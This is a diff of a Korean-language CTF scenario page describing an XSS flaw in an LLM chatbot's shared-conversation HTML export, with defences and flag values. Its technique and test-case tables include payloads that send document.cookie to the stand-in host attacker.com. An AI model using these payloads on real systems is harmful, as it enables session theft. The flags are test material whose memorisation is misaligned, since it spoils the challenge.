@@ -1,5 +1,7 @@
 # 🧩 CTF 시나리오 05: 부적절한 출력 처리 (Improper Output Handling / XSS)
 
+<br>
+
 ## 📌 시나리오 ID
 
 `SCENARIO_05`
@@ -8,17 +10,7 @@
 
 이 시나리오는 Cross-Site Scripting(XSS) 취약점이 존재하는 웹 챗봇 시스템인 ChatLLL을 대상으로 한다. 공격자는 사용자의 입력이 출력 시 적절히 이스케이프되지 않는다는 점을 악용하여, 공유 HTML 파일에 악성 JavaScript를 삽입하고, 이를 통해 관리자 세션 쿠키(`admin_session`)를 탈취하는 것이 목표이다.
 
-## 🕸️ 시스템 구성 및 동작 흐름
-
-| 단계 | 설명                                                                                    |
-| -- | ------------------------------------------------------------------------------------- |
-| 1  | 사용자가 메시지를 입력하면 `conversation_history`에 저장됨                                            |
-| 2  | `ctf05_LLM_ask()` 함수가 GPT-3.5-turbo를 호출해 응답 생성                                        |
-| 3  | `ctf05_generate_share_html()` 함수가 대화 내역을 HTML 파일로 변환함. 이때 사용자 입력이 escape되지 않고 그대로 삽입됨 |
-| 4  | `ctf05_admin_bot_visit()` 함수가 관리자의 HTML 열람을 헤드리스 브라우저로 시뮬레이션함                         |
-| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨                                    |
-
----
+<br>
 
 ## 🎯 시나리오 목표
 
@@ -41,17 +33,27 @@
 
 <br>
 
-## 🔥 공격 기법 예시
+## 💥 공격 흐름 예시
+### 1. 🔥 공격 기법
 
-| 기법            | 설명                                                                        |
-| ------------- | ------------------------------------------------------------------------- |
+| 기법 | 설명 |
+|-----------|------|
 | `<script>` 삽입 | `<script>alert(1)</script>` 형태로 기본적인 XSS 실행                               |
 | 쿠키 탈취         | `<script>location.href='http://attacker.com?c='+document.cookie</script>` |
 | 이미지 오류 이벤트    | `<img src=x onerror=alert('XSS')>`                                        |
 | HTML 엔티티 우회   | `&lt;script&gt;alert(1)&lt;/script&gt;`                                   |
 | DOM 조작        | `<script>document.body.innerHTML='hacked'</script>`                       |
 
----
+## 🕸️ 시스템 구성 및 동작 흐름
+| 단계 | 설명                                                                                    |
+| -- | ------------------------------------------------------------------------------------- |
+| 1  | 사용자가 메시지를 입력하면 `conversation_history`에 저장됨                                            |
+| 2  | `ctf05_LLM_ask()` 함수가 GPT-3.5-turbo를 호출해 응답 생성                                        |
+| 3  | `ctf05_generate_share_html()` 함수가 대화 내역을 HTML 파일로 변환함. 이때 사용자 입력이 escape되지 않고 그대로 삽입됨 |
+| 4  | `ctf05_admin_bot_visit()` 함수가 관리자의 HTML 열람을 헤드리스 브라우저로 시뮬레이션함                         |
+| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨                                    |
+
+<br>
 
 ## ✅ 테스트 케이스 예시
 
@@ -62,8 +64,7 @@
 | `<img src=x onerror=alert('XSS')>`                               | 관리자 브라우저에서 alert 실행 |
 | `<script>fetch('http://attacker.com?'+document.cookie)</script>` | 쿠키 탈취 가능            |
 
----
-
+<br>
 
 ## 🛡️ 위협 요소 및 대응 방안
 
@@ -73,7 +74,7 @@
 | 관리자 권한 탈취        | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩              |
 | JavaScript 임의 실행 | 악성 행위 유도         | CSP(Content Security Policy) 적용 |
 
----
+<br>
 
 ## ✅ 보안 권장 사항
 
@@ -82,7 +83,7 @@
 * 모든 사용자 입력에 대한 서버 측 필터링 적용
 * `HttpOnly`, `Secure` 쿠키 설정으로 브라우저 접근 차단
 
----
+<br>
 
 ## 🧪 Flag 제출 방식
 
@@ -100,5 +101,7 @@ flag{llm_xss_success}
 ## 🔐 모델 요구 조건
 
 * 관리자 브라우저에서 악성 스크립트가 실행되어야 함
+
 * `admin_session` 쿠키를 외부 서버로 전송해야 함
+
 * 플래그: `ctf05_flag{XSS_1n_5h4r3d_C0nv3r54710n5!}`
